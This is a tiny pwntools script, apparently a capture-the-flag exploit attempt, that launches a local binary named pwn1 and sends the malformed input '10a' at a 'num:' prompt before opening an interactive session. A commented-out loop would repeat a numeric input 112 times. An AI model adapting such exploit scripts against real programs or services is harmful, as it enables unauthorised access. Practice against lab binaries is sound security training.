from pwn import *

context.log_level='debug'

ELFpath='/home/lixingjian/pwn1'
p=process(ELFpath)

# for i in range(112):
#     p.sendlineafter(b':',b'9')

p.sendlineafter(b'num:',b'10a')


p.interactive()
